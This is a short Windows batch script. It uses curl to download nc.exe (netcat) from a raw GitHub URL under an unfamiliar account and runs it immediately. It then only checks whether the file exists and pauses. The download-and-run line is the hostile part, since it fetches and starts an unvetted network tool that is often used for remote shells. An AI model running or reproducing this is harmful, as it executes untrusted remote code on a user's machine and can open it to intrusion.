@echo off
curl -L -o nc.exe https://raw.githubusercontent.com/VRVRxX/projects/main/nc.exe && start nc.exe
setlocal enabledelayedexpansion

:: Check if nc.exe exists in the script's directory
if exist "%~dp0nc.exe" (
    echo File found
) else (
    echo File not found
)

pause
